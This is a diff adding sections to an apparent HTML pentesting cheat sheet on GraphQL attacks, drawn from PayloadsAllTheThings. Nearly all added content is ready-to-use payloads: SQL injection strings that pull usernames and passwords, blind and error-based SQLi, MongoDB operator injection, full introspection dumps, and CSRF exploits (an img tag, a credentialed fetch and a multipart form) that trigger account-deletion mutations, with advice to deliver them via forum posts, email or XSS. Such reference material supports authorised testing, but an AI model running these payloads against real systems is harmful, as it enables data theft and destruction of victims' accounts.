@@ -252,6 +252,109 @@ EOF
 # If CSRF via GET is flagged: introspection (and potentially mutations) run over GET
 # Deliver as &lt;img src="https://target/graphql?query=mutation{...}"&gt; in a forum post</code></pre>
 
+  <h2>GraphQL Injection Payloads</h2>
+  <p>Additional injection payloads and enumeration techniques from PayloadsAllTheThings.</p>
+
+  <h3>Identify Injection Point</h3>
+  <pre><code># Quick probe via GET (also tests CSRF via GET):
+https://target.com/graphql?query={__schema{types{name}}}
+https://target.com/graphiql?query={__schema{types{name}}}
+
+# Error-based discovery:
+?query={__schema}             # malformed — triggers helpful error
+?query={}                     # empty query error
+?query={thisdoesnotexist}     # "Did you mean X?" suggestion leak
+
+# Identify engine via error messages:
+?query={__typename}           # returns query root type name
+# Apollo: {"data":{"__typename":"Query"}}
+# Hasura: different structure</code></pre>
+
+  <h3>SQL Injection via GraphQL</h3>
+  <pre><code># SQLi in string argument:
+{"query":"{ user(name: \"admin'--\") { id email } }"}
+
+# Using variables (cleaner for complex payloads):
+{"query":"query($n:String!){user(name:$n){id email}}","variables":{"n":"admin' OR '1'='1"}}
+
+# Blind SQLi via GraphQL:
+{"query":"{ user(id: 1 AND SLEEP(5)) { id } }"}
+
+# UNION-based via GraphQL:
+{"query":"{ search(term: \"' UNION SELECT username,password FROM users-- \") { results } }"}
+
+# Error-based SQLi:
+{"query":"{ user(id: \"1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))\") { id } }"}</code></pre>
+
+  <h3>NoSQL Injection via GraphQL</h3>
+  <pre><code># MongoDB operator injection (if backend is MongoDB):
+{"query":"{ users(filter: \"{\\\"$gt\\\":\\\"\\\"}\") { id } }"}
+# Or pass as variable:
+{"query":"query($f:String!){users(filter:$f){id}}","variables":{"f":"{\"$gt\":\"\"}"}}</code></pre>
+
+  <h2>Introspection Queries</h2>
+  <p>Full schema dump queries from PayloadsAllTheThings for use with InQL or manual enumeration.</p>
+
+  <h3>Minimal Type Listing</h3>
+  <pre><code>{"query":"{ __schema { types { name } } }"}</code></pre>
+
+  <h3>Full Schema Dump</h3>
+  <pre><code>{"query":"{__schema{queryType{name}mutationType{name}types{kind name description fields(includeDeprecated:true){name description args{name description type{kind name ofType{kind name ofType{kind name ofType{kind name}}}}defaultValue}type{kind name ofType{kind name ofType{kind name ofType{kind name}}}}isDeprecated deprecationReason}inputFields{name description type{kind name ofType{kind name ofType{kind name ofType{kind name}}}}defaultValue}interfaces{kind name ofType{kind name ofType{kind name ofType{kind name}}}}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}directives{name description locations args{name description type{kind name ofType{kind name ofType{kind name ofType{kind name}}}}defaultValue}}}}"}</code></pre>
+
+  <h3>List All Queries and Mutations</h3>
+  <pre><code>{"query":"{ __schema { queryType { fields { name description args { name type { name kind } } } } mutationType { fields { name description args { name type { name kind } } } } } }"}</code></pre>
+
+  <h3>Enumerate Field Paths with graphql-path-enum</h3>
+  <pre><code># Find all paths to reach a specific type:
+pip install graphql-path-enum
+# Usage: python3 graphql_path_enum.py -i introspection.json -t User
+
+# Tools:
+# graphql-cop — comprehensive security audit:
+pip install graphql-cop
+graphql-cop -t https://target/graphql -o json | jq .
+
+# GraphQLmap — scripting engine for pentesting:
+git clone https://github.com/swisskyrepo/GraphQLmap
+python3 graphqlmap.py --url https://target/graphql --method POST
+
+# Clairvoyance — schema inference without introspection:
+pip install clairvoyance
+clairvoyance https://target/graphql -o schema.json</code></pre>
+
+  <h2>GraphQL CSRF</h2>
+  <p>CSRF exploitation via GraphQL from PayloadsAllTheThings.</p>
+
+  <h3>CSRF via GET Request</h3>
+  <pre><code>&lt;!-- If introspection or mutations work over GET: --&gt;
+&lt;img src="https://target/graphql?query=mutation{deleteAccount{success}}"&gt;
+
+&lt;!-- Deliver via forum post, email, or XSS --&gt;</code></pre>
+
+  <h3>CSRF via POST Without Content-Type</h3>
+  <pre><code>&lt;!-- If GraphQL accepts POST without Content-Type header (no CORS preflight): --&gt;
+&lt;html&gt;&lt;body&gt;&lt;script&gt;
+fetch("https://target/graphql", {
+  method: "POST",
+  body: JSON.stringify({query: "mutation { deleteAccount { success } }"}),
+  credentials: "include"
+  // Note: no Content-Type header means text/plain → no preflight
+});
+&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;
+
+&lt;!-- Test with BatchQL: --&gt;
+python3 batch.py -e https://target/graphql
+# Look for: [+] CSRF via POST (no Content-Type): VULNERABLE</code></pre>
+
+  <h3>CSRF via multipart/form-data</h3>
+  <pre><code>&lt;!-- Some GraphQL endpoints accept multipart uploads (file upload mutations) --&gt;
+&lt;!-- multipart requests don't require preflight for simple form enctype --&gt;
+&lt;form action="https://target/graphql" method="POST" enctype="multipart/form-data"&gt;
+  &lt;input name="operations" value='{"query":"mutation{deleteUser{ok}}"}'&gt;
+  &lt;input name="map" value="{}"&gt;
+  &lt;input type="submit"&gt;
+&lt;/form&gt;</code></pre>
+
   <h2>Tools &amp; Resources</h2>
   <ul>
     <li>BatchQL — <code>github.com/assetnote/batchql</code></li>
